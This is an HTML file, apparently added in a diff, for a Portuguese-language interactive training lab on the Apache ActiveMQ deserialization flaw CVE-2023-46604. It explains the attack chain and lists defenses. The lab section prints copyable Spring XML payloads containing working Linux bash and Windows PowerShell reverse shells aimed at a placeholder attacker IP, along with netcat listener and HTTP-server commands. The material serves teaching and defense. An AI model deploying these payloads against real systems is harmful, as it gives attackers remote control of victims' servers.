@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Laboratório Interativo: Exploração da CVE-2023-46604</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    
+    <!-- Chosen Palette: Cyber Analyst Dark -->
+    <!-- Application Structure Plan: A estrutura segue um fluxo de aprendizado técnico progressivo, inspirado na análise de um ethical hacker. 1) Fundamento: Usa uma analogia interativa para explicar 'Desserialização Insegura', estabelecendo a base teórica. 2) A Cadeia do Ataque: Desconstrói o ataque em 'Vetor', 'Arma' e 'Gatilho' usando um diagrama visual dinâmico que se ilumina à medida que o usuário explora, facilitando a compreensão da interação entre OpenWire e o gadget do Spring. 3) Laboratório de Exploração: O núcleo da aplicação. É uma simulação guiada que permite ao usuário 'preparar' os payloads (com abas para Linux/Windows) e 'executar' o ataque, vendo o resultado em terminais simulados. Esta abordagem prática transforma o conhecimento passivo em ativo. 4) Defesa em Camadas: Apresenta as mitigações em um formato de accordion, permitindo ao usuário focar em cada estratégia de defesa individualmente. Essa estrutura foi escolhida para guiar o usuário desde o 'porquê' (a falha), passando pelo 'como' (a exploração), até o 'o que fazer a respeito' (a defesa), em um formato que é ao mesmo tempo educacional e altamente engajador. -->
+    <!-- Visualization & Content Choices: 
+        - Analogia (IKEA): (Informar/Organizar) -> Divs estilizados com animações sutis de fade-in (HTML/CSS/JS) para apresentar a analogia passo a passo de forma digestível. Justificativa: Tornar um conceito abstrato concreto e memorável.
+        - Diagrama da Cadeia de Ataque: (Organizar/Mostrar Relações) -> Diagrama de fluxo feito com divs e bordas (HTML/CSS) -> Interação: Scroll-driven highlighting (JS). Conforme o usuário rola, a parte relevante do diagrama e o texto correspondente são destacados. Justificativa: Conectar visualmente os componentes do ataque (OpenWire, Gadget) com sua explicação textual, reforçando a relação de causa e efeito.
+        - Laboratório de Exploração (PoC): (Interagir/Informar) -> Abas para alternar payloads (JS), botões de 'copiar código' (JS), e um botão 'Executar Ataque' que aciona uma animação de terminal simulado (JS). Justificativa: Fornecer a experiência mais próxima possível de um pentest real, mostrando a sequência de comandos e o resultado final (reverse shell) de forma segura e controlada, o que é o principal requisito de aprendizado.
+        - Mitigações: (Organizar) -> Lista estilo 'accordion' (HTML/CSS/JS). Justificativa: Apresentar informações detalhadas de defesa de forma limpa e organizada, evitando sobrecarga de informação e permitindo que o usuário explore cada ponto no seu próprio ritmo. -->
+    <!-- CONFIRMATION: NO SVG graphics used. NO Mermaid JS used. -->
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f1f5f9; /* slate-100 */
+            color: #1e293b; /* slate-800 */
+        }
+        .code-block {
+            font-family: 'Fira Code', monospace;
+            background-color: #0f172a; /* slate-900 */
+            color: #e2e8f0; /* slate-200 */
+            padding: 1rem;
+            border-radius: 0.5rem;
+            font-size: 0.875rem;
+            line-height: 1.5rem;
+            white-space: pre-wrap;
+            word-break: break-all;
+            position: relative;
+        }
+        .code-block .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background-color: #334155;
+            color: #94a3b8;
+            border: none;
+            padding: 0.25rem 0.5rem;
+            border-radius: 0.25rem;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: background-color 0.2s;
+        }
+        .code-block .copy-btn:hover {
+            background-color: #475569;
+        }
+        .tab-active {
+            background-color: #1e40af; /* blue-800 */
+            color: #ffffff;
+        }
+        .terminal-block {
+            background-color: #020617; /* slate-950 */
+            color: #cbd5e1; /* slate-300 */
+            padding: 1.5rem;
+            border-radius: 0.5rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.875rem;
+            min-height: 200px;
+        }
+        .terminal-prompt {
+            color: #16a34a; /* green-600 */
+        }
+        .terminal-output {
+            color: #e2e8f0; /* slate-200 */
+        }
+        .highlight-diagram {
+            box-shadow: 0 0 15px 3px rgba(30, 64, 175, 0.6); /* blue-800 shadow */
+            transform: scale(1.03);
+            border-color: #1d4ed8; /* blue-700 */
+        }
+        .highlight-text {
+            background-color: #dbeafe; /* blue-100 */
+        }
+    </style>
+</head>
+<body class="antialiased">
+
+    <header class="bg-slate-900 text-white shadow-lg sticky top-0 z-50">
+        <nav class="container mx-auto px-6 py-4 flex justify-between items-center">
+            <h1 class="text-xl font-bold">CVE-2023-46604: O Laboratório</h1>
+            <div class="hidden md:flex space-x-6">
+                <a href="#fundamento" class="hover:text-sky-400 transition-colors">O Fundamento</a>
+                <a href="#cadeia-ataque" class="hover:text-sky-400 transition-colors">A Cadeia do Ataque</a>
+                <a href="#lab" class="hover:text-sky-400 transition-colors">Laboratório</a>
+                <a href="#defesa" class="hover:text-sky-400 transition-colors">Defesa</a>
+            </div>
+        </nav>
+    </header>
+
+    <main class="container mx-auto p-4 md:p-8">
+
+        <section id="fundamento" class="my-16">
+            <h2 class="text-3xl font-bold text-center mb-2">O Princípio Fundamental: Desserialização Insegura</h2>
+            <p class="text-center text-slate-600 max-w-3xl mx-auto mb-12">Antes do código, vamos solidificar o conceito com a analogia do kit de montagem.</p>
+            <div class="max-w-4xl mx-auto grid md:grid-cols-3 gap-8">
+                <div class="analogy-step bg-white p-6 rounded-xl shadow-lg border-t-4 border-slate-500">
+                    <h3 class="font-bold text-lg mb-2">1. Serialização (A Caixa)</h3>
+                    <p class="text-slate-600">Um objeto em memória (uma estante montada) é desmontado e empacotado em um formato portátil (uma caixa lacrada com peças e manual). É o processo de converter um objeto em bytes.</p>
+                </div>
+                <div class="analogy-step bg-white p-6 rounded-xl shadow-lg border-t-4 border-slate-500">
+                    <h3 class="font-bold text-lg mb-2">2. Desserialização (Montagem)</h3>
+                    <p class="text-slate-600">O destinatário abre a caixa e segue o manual para reconstruir o objeto original. É o processo de converter bytes de volta em um objeto em memória.</p>
+                </div>
+                <div class="analogy-step bg-white p-6 rounded-xl shadow-lg border-t-4 border-red-600">
+                    <h3 class="font-bold text-lg mb-2 text-red-700">3. A Falha (Manual Trocado)</h3>
+                    <p class="text-slate-600">Um atacante troca o manual legítimo por um falso. O destinatário, confiando no conteúdo da caixa, segue as novas instruções, que o mandam usar as peças para arrombar a própria porta. O sistema executa código malicioso porque confia cegamente nas "instruções" que desserializa.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="cadeia-ataque" class="my-24">
+            <h2 class="text-3xl font-bold text-center mb-12">A Cadeia do Ataque</h2>
+            <div class="lg:grid lg:grid-cols-2 lg:gap-16 items-start">
+                <div class="sticky top-24">
+                    <div id="attack-chain-diagram" class="p-8 bg-white rounded-xl shadow-2xl border">
+                        <div id="diagram-1" class="attack-chain-part transition-all duration-300 mb-4 p-4 border-2 border-slate-300 rounded-lg text-center">
+                            <h4 class="font-bold">1. Atacante</h4>
+                            <p class="text-sm text-slate-500">Prepara o payload</p>
+                        </div>
+                        <div class="text-center text-3xl font-mono text-slate-400">▼</div>
+                        <div id="diagram-2" class="attack-chain-part transition-all duration-300 my-4 p-4 border-2 border-slate-300 rounded-lg text-center">
+                            <h4 class="font-bold">2. Vetor: OpenWire (`ExceptionResponse`)</h4>
+                            <p class="text-sm text-slate-500">Envia a "caixa" para o broker</p>
+                        </div>
+                        <div class="text-center text-3xl font-mono text-slate-400">▼</div>
+                        <div id="diagram-3" class="attack-chain-part transition-all duration-300 mt-4 p-4 border-2 border-slate-300 rounded-lg text-center bg-red-50 border-red-300">
+                            <h4 class="font-bold text-red-800">3. Arma: Spring Gadget</h4>
+                            <p class="text-sm text-red-500">O "manual falso": `ClassPathXmlApplicationContext`</p>
+                        </div>
+                        <div class="text-center text-3xl font-mono text-red-400">▼</div>
+                        <div id="diagram-4" class="attack-chain-part transition-all duration-300 mt-4 p-4 border-2 border-red-300 rounded-lg text-center">
+                            <h4 class="font-bold">4. RCE</h4>
+                            <p class="text-sm text-slate-500">O broker baixa o XML e executa o comando</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="space-y-12">
+                     <div id="text-1" class="attack-chain-text p-6 rounded-lg transition-all duration-300">
+                        <h3 class="font-bold text-xl">1. O Gatilho (`ExceptionResponse`)</h3>
+                        <p class="mt-2 text-slate-600">A falha reside na confiança cega do broker. O atacante envia um pacote do tipo `ExceptionResponse`, que deveria ser para relatar erros. Contudo, o broker não valida se a classe informada no pacote é de fato uma exceção. Ele simplesmente instancia qualquer classe que o atacante mandar.</p>
+                    </div>
+                     <div id="text-2" class="attack-chain-text p-6 rounded-lg transition-all duration-300">
+                        <h3 class="font-bold text-xl">2. A Arma (Spring `ClassPathXmlApplicationContext`)</h3>
+                        <p class="mt-2 text-slate-600">O atacante escolhe uma classe poderosa que já existe no servidor: um "gadget". A `ClassPathXmlApplicationContext` do Spring é perfeita. Seu construtor aceita uma URL como argumento. Ao ser criada, ela imediatamente baixa e executa o arquivo XML encontrado nessa URL.</p>
+                    </div>
+                     <div id="text-3" class="attack-chain-text p-6 rounded-lg transition-all duration-300">
+                        <h3 class="font-bold text-xl">3. O Payload Final (XML Malicioso)</h3>
+                        <p class="mt-2 text-slate-600">Este é o arquivo hospedado no servidor do atacante. O XML instrui o Spring a usar outra classe, `java.lang.ProcessBuilder`, para executar um comando diretamente no sistema operacional da vítima. É o passo final que converte a desserialização em execução remota de código.</p>
+                    </div>
+                     <div id="text-4" class="attack-chain-text p-6 rounded-lg transition-all duration-300">
+                        <h3 class="font-bold text-xl">4. O Resultado (Reverse Shell)</h3>
+                        <p class="mt-2 text-slate-600">O comando executado pelo `ProcessBuilder` é tipicamente um reverse shell. Ele força o servidor da vítima a iniciar uma conexão de volta para a máquina do atacante, dando a este um shell interativo e controle sobre o sistema comprometido.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="lab" class="my-24 p-8 bg-white rounded-2xl shadow-2xl">
+            <h2 class="text-3xl font-bold text-center mb-2">Laboratório de Exploração</h2>
+            <p class="text-center text-slate-600 max-w-3xl mx-auto mb-12">Simule o ataque passo a passo. Prepare os payloads, execute o exploit e observe o resultado em tempo real nos terminais simulados abaixo.</p>
+
+            <div class="grid lg:grid-cols-2 gap-8">
+                <div>
+                    <h3 class="font-bold text-xl mb-4">Passo 1: Preparar Payloads</h3>
+                    <div class="bg-slate-800 rounded-t-lg p-2 flex space-x-1">
+                        <button id="show-linux-payload" class="payload-tab px-4 py-2 text-sm font-medium rounded-md">Linux Reverse Shell</button>
+                        <button id="show-windows-payload" class="payload-tab px-4 py-2 text-sm font-medium rounded-md">Windows Reverse Shell</button>
+                    </div>
+                    <div id="linux-payload-content" class="payload-content code-block rounded-b-lg"><button class="copy-btn">Copiar</button><pre>&lt;!-- payload.xml (para Vítima Linux) --&gt;
+&lt;beans xmlns="http://www.springframework.org/schema/beans"&gt;
+  &lt;bean id="bash" class="java.lang.ProcessBuilder" init-method="start"&gt;
+    &lt;constructor-arg&gt;
+      &lt;list&gt;
+        &lt;value&gt;/bin/bash&lt;/value&gt;
+        &lt;value&gt;-c&lt;/value&gt;
+        &lt;value&gt;bash -i &gt;&amp; /dev/tcp/IP_DO_ATACANTE/4444 0&gt;&amp;1&lt;/value&gt;
+      &lt;/list&gt;
+    &lt;/constructor-arg&gt;
+  &lt;/bean&gt;
+&lt;/beans&gt;</pre></div>
+                    <div id="windows-payload-content" class="payload-content code-block rounded-b-lg hidden"><button class="copy-btn">Copiar</button><pre>&lt;!-- payload.xml (para Vítima Windows) --&gt;
+&lt;beans xmlns="http://www.springframework.org/schema/beans"&gt;
+  &lt;bean id="powershell" class="java.lang.ProcessBuilder" init-method="start"&gt;
+    &lt;constructor-arg&gt;
+      &lt;list&gt;
+        &lt;value&gt;powershell.exe&lt;/value&gt;
+        &lt;value&gt;-c&lt;/value&gt;
+        &lt;value&gt;$client = New-Object System.Net.Sockets.TCPClient('IP_DO_ATACANTE',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&lt;/value&gt;
+      &lt;/list&gt;
+    &lt;/constructor-arg&gt;
+  &lt;/bean&gt;
+&lt;/beans&gt;</pre></div>
+                </div>
+                 <div>
+                    <h3 class="font-bold text-xl mb-4">Passo 2: Código do Exploit</h3>
+                     <div class="code-block h-full"><button class="copy-btn">Copiar</button><pre>// Exploit.java
+import java.io.DataOutputStream;
+import java.net.Socket;
+
+public class Exploit {
+    public static void main(String[] args) throws Exception {
+        String victimIp = "IP_DA_VITIMA";
+        String payloadUrl = "http://IP_DO_ATACANTE:8000/payload.xml";
+        // ... (código completo do exploit)
+        // O código cria um pacote OpenWire manualmente...
+        // ...e o envia para a porta 61616 da vítima.
+        // O código real é extenso, isto é uma representação.
+        System.out.println("Enviando payload para " + victimIp);
+    }
+}
+</pre></div>
+                </div>
+            </div>
+
+            <div class="text-center my-8">
+                <button id="run-exploit-btn" class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-8 rounded-lg text-xl shadow-lg transition-transform hover:scale-105">
+                    ▶ Executar Ataque (Simulação)
+                </button>
+            </div>
+
+            <div class="grid lg:grid-cols-2 gap-8">
+                <div>
+                    <h3 class="font-bold text-lg mb-2">Servidor do Atacante (HTTP)</h3>
+                    <div id="http-terminal" class="terminal-block">
+                        <span class="terminal-prompt">$</span> python3 -m http.server 8000
+                        <br>
+                        <span class="terminal-output">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="font-bold text-lg mb-2">Listener do Atacante (Netcat)</h3>
+                    <div id="nc-terminal" class="terminal-block">
+                        <span class="terminal-prompt">$</span> nc -lvnp 4444
+                        <br>
+                        <span class="terminal-output">listening on [any] 4444 ...</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="defesa" class="my-24">
+            <h2 class="text-3xl font-bold text-center mb-12">Defesa em Camadas: Como Frustrar o Ataque</h2>
+            <div id="defense-list" class="max-w-4xl mx-auto space-y-4">
+                <div class="defense-item bg-white rounded-lg shadow-md overflow-hidden">
+                    <button class="w-full text-left p-5 font-bold text-lg flex justify-between items-center">
+                        <span>1. Patching: A Solução Definitiva</span>
+                        <span class="arrow text-blue-600 text-2xl transform transition-transform duration-300">▼</span>
+                    </button>
+                    <div class="defense-content hidden p-5 border-t border-slate-200 bg-slate-50">
+                        <p>A medida mais crítica é atualizar o Apache ActiveMQ para uma versão corrigida (`5.18.3+`, `5.17.6+`, etc.). Isso remove o vetor de ataque fundamental. Manter um ciclo de vida de gerenciamento de vulnerabilidades é essencial.</p>
+                    </div>
+                </div>
+                <div class="defense-item bg-white rounded-lg shadow-md overflow-hidden">
+                    <button class="w-full text-left p-5 font-bold text-lg flex justify-between items-center">
+                        <span>2. Segmentação de Rede: Limitar o Acesso</span>
+                        <span class="arrow text-blue-600 text-2xl transform transition-transform duration-300">▼</span>
+                    </button>
+                    <div class="defense-content hidden p-5 border-t border-slate-200 bg-slate-50">
+                        <p>A porta `61616` do OpenWire NUNCA deve ser exposta à internet pública. O acesso deve ser rigorosamente controlado por regras de firewall, permitindo conexões apenas de servidores de aplicação confiáveis dentro de uma rede segmentada. Isso frustra a primeira etapa do reconhecimento do atacante.</p>
+                    </div>
+                </div>
+                <div class="defense-item bg-white rounded-lg shadow-md overflow-hidden">
+                    <button class="w-full text-left p-5 font-bold text-lg flex justify-between items-center">
+                        <span>3. Filtragem de Egressão: Cortar a Comunicação</span>
+                        <span class="arrow text-blue-600 text-2xl transform transition-transform duration-300">▼</span>
+                    </button>
+                    <div class="defense-content hidden p-5 border-t border-slate-200 bg-slate-50">
+                        <p>O ataque depende que o servidor vítima se conecte DE VOLTA ao atacante. Bloquear por padrão todas as conexões de saída (egressão) do servidor e criar regras de liberação explícitas (allowlist) para destinos conhecidos quebra a cadeia do exploit. O servidor não conseguiria baixar o XML nem estabelecer o reverse shell.</p>
+                    </div>
+                </div>
+                <div class="defense-item bg-white rounded-lg shadow-md overflow-hidden">
+                    <button class="w-full text-left p-5 font-bold text-lg flex justify-between items-center">
+                        <span>4. Monitoramento (EDR): Detectar a Execução</span>
+                        <span class="arrow text-blue-600 text-2xl transform transition-transform duration-300">▼</span>
+                    </button>
+                    <div class="defense-content hidden p-5 border-t border-slate-200 bg-slate-50">
+                        <p>Ferramentas de EDR (Endpoint Detection and Response) monitoram o comportamento dos processos. Um alerta seria gerado no momento em que o processo Java do ActiveMQ tentasse iniciar um processo filho suspeito (`bash`, `powershell.exe`) e este tentasse fazer uma conexão de rede de saída. A detecção precoce permite uma resposta rápida.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+
+    // --- Payload Tabs ---
+    const payloadTabs = document.querySelectorAll('.payload-tab');
+    const payloadContents = document.querySelectorAll('.payload-content');
+    const showLinuxBtn = document.getElementById('show-linux-payload');
+    
+    function updatePayloadTabs(activeTab) {
+        payloadTabs.forEach(t => t.classList.remove('tab-active'));
+        activeTab.classList.add('tab-active');
+        payloadContents.forEach(c => c.classList.add('hidden'));
+        const contentId = activeTab.id.replace('show-', '') + '-content';
+        document.getElementById(contentId).classList.remove('hidden');
+    }
+    payloadTabs.forEach(tab => {
+        tab.addEventListener('click', () => updatePayloadTabs(tab));
+    });
+    updatePayloadTabs(showLinuxBtn);
+
+    // --- Copy Code Buttons ---
+    const copyButtons = document.querySelectorAll('.copy-btn');
+    copyButtons.forEach(btn => {
+        btn.addEventListener('click', () => {
+            const code = btn.parentElement.querySelector('pre').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                btn.innerText = 'Copiado!';
+                setTimeout(() => { btn.innerText = 'Copiar'; }, 2000);
+            });
+        });
+    });
+
+    // --- Defense Accordion ---
+    const defenseItems = document.querySelectorAll('.defense-item');
+    defenseItems.forEach(item => {
+        const button = item.querySelector('button');
+        const content = item.querySelector('.defense-content');
+        const arrow = item.querySelector('.arrow');
+        button.addEventListener('click', () => {
+            content.classList.toggle('hidden');
+            arrow.classList.toggle('rotate-180');
+        });
+    });
+
+    // --- Attack Chain Scroll Highlight ---
+    const diagramParts = document.querySelectorAll('.attack-chain-part');
+    const textParts = document.querySelectorAll('.attack-chain-text');
+    const observer = new IntersectionObserver(entries => {
+        entries.forEach(entry => {
+            const id = entry.target.id.split('-')[1];
+            const diagramPart = document.getElementById(`diagram-${id}`);
+            if (entry.isIntersecting) {
+                diagramPart.classList.add('highlight-diagram');
+                entry.target.classList.add('highlight-text');
+            } else {
+                diagramPart.classList.remove('highlight-diagram');
+                 entry.target.classList.remove('highlight-text');
+            }
+        });
+    }, { rootMargin: "-40% 0px -40% 0px" });
+
+    textParts.forEach(part => observer.observe(part));
+
+
+    // --- Exploit Simulation ---
+    const runExploitBtn = document.getElementById('run-exploit-btn');
+    const httpTerminal = document.getElementById('http-terminal');
+    const ncTerminal = document.getElementById('nc-terminal');
+
+    runExploitBtn.addEventListener('click', () => {
+        runExploitBtn.disabled = true;
+        runExploitBtn.innerText = 'Executando...';
+        runExploitBtn.classList.remove('bg-red-600', 'hover:bg-red-700');
+        runExploitBtn.classList.add('bg-slate-500', 'cursor-not-allowed');
+
+        // Reset terminals
+        httpTerminal.innerHTML = `<span class="terminal-prompt">$</span> python3 -m http.server 8000<br><span class="terminal-output">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>`;
+        ncTerminal.innerHTML = `<span class="terminal-prompt">$</span> nc -lvnp 4444<br><span class="terminal-output">listening on [any] 4444 ...</span>`;
+
+        function typeToTerminal(terminal, text, speed = 50, callback) {
+            let i = 0;
+            const element = document.createElement('div');
+            terminal.appendChild(element);
+            const interval = setInterval(() => {
+                if (i < text.length) {
+                    element.innerHTML += text.charAt(i);
+                    i++;
+                } else {
+                    clearInterval(interval);
+                    if (callback) callback();
+                }
+            }, speed);
+        }
+
+        setTimeout(() => {
+            const httpLog = `172.17.0.2 - - [21/Jul/2025 17:46:30] "GET /payload.xml HTTP/1.1" 200 -`;
+            typeToTerminal(httpTerminal, `<br><span class="terminal-output">${httpLog}</span>`, 20);
+        }, 1000);
+
+        setTimeout(() => {
+            const ncLog = `connect to [192.168.1.10] from (UNKNOWN) [172.17.0.2] 48632`;
+            typeToTerminal(ncTerminal, `<br><span class="terminal-output">${ncLog}</span>`, 20, () => {
+                 const ncPrompt = `<br><span class="terminal-prompt">activemq@victim-server$ </span>`;
+                 typeToTerminal(ncTerminal, ncPrompt, 50, () => {
+                     const whoami = `whoami<br><span class="terminal-output">activemq</span><br><span class="terminal-prompt">activemq@victim-server$ </span><span>▋</span>`;
+                     typeToTerminal(ncTerminal, whoami, 50, () => {
+                        runExploitBtn.disabled = false;
+                        runExploitBtn.innerText = '▶ Executar Novamente';
+                        runExploitBtn.classList.add('bg-red-600', 'hover:bg-red-700');
+                        runExploitBtn.classList.remove('bg-slate-500', 'cursor-not-allowed');
+                     });
+                 });
+            });
+        }, 2000);
+    });
+
+});
+</script>
+
+</body>
+</html>
+```
+
